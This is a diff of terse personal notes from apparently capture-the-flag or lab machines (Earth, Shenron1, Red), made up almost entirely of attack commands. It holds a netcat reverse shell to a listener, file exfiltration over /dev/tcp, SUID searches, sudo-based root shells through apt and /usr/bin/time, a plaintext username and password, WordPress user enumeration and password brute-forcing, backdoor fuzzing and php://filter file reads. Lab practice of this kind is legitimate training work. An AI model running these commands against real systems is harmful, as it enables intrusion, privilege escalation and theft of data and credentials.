@@ -1,18 +1,58 @@
 Mercury:
+{}
+
 
 Earth:
+{
 Spawn a bash shell old ver:
 nc -e /bin/bash <listener> 3333
 python -c "import pty; pty.spawn("bash")'
+
 Find files with permission:
 find / -perm -u=s -ls 2>/dev/null
+
 Send a file: 
 Sender: nc <ip> <port> < filename *or* cat /path/to/file > /dev/tcp/<listener>/3333
 Reciever: nc -lnvp > filename
+}
+
 Venus:
+{}
+
 
 Shenron1:
+{
 Cred in cmt
 sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
 
 jenny:Mypa$$wordi$notharD@123
+}
+
+
+Red:
+{
+Hashcat rules(gen rule based wordlist):
+hashcat --force pass.txt -r /usr/share/hashcat/rules/best66.rule --stdout > wordlist.txt
+
+WORDPRESS scanning:
+Enumerate usernames:
+wpscan --url http://0.0.0.0/ -e u
+wpscan --url http://0.0.0.0/ -e u,p
+
+Password attack if username is known:
+wpscan --url http://0.0.0.0/ --usernames admin --passwords /usr/share/wordlist.txt
+
+Backdoor scanning(needed tool: seclists ~500MB):
+gobuster dir -u http://0.0.0.0/ -w /usr/share/seclists/Discovery/Web-Content/P-L-S/CommonBackdoor-PHP.fuzz.txt
+
+Fuzzing (read /etc/passwd if exists):
+wfuzz -u http://0.0.0.0/backdoor.php?FUZZ=/path/to/wherever
+
+Reading the backdoor file:
+curl http://0.0.0.0/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php
+
+had perm to run /usr/bin/time
+Switching user using that:
+sudo -u ippsec /usr/bin/time /bin/sh
+
+}
